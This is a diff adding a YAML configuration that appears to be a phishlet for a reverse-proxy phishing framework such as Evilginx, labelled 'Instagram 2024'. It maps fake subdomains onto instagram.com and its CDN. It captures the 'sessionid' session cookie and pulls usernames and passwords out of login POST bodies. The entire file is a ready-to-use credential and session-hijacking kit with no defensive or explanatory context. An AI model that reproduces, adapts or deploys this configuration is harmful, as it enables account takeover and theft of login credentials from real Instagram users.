@@ -1,0 +1,68 @@
+name: "Instagram 2024"
+author: "syrex1013"
+min_ver: "3.0.0"
+redirect_url: "http://google.com"
+
+proxy_hosts:
+  - {
+      phish_sub: "",
+      orig_sub: "",
+      domain: "instagram.com",
+      session: true,
+      is_landing: false,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "www",
+      orig_sub: "www",
+      domain: "instagram.com",
+      session: true,
+      is_landing: true,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "m",
+      orig_sub: "m",
+      domain: "instagram.com",
+      session: true,
+      is_landing: false,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "graphql.xx",
+      orig_sub: "graphql",
+      domain: "instagram.com",
+      session: true,
+      is_landing: false,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "static.xx",
+      orig_sub: "static",
+      domain: "cdninstagram.com",
+      session: false,
+      is_landing: false,
+      auto_filter: true,
+    }
+
+auth_tokens:
+  - domain: ".instagram.com"
+    keys: ["sessionid"]
+    type: "cookie"
+
+auth_urls:
+  - "/accounts/login/"
+
+credentials:
+  username:
+    key: "email"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "pass"
+    search: "(.*)"
+    type: "post"
+
+login:
+  domain: "www.instagram.com"
+  path: "/"
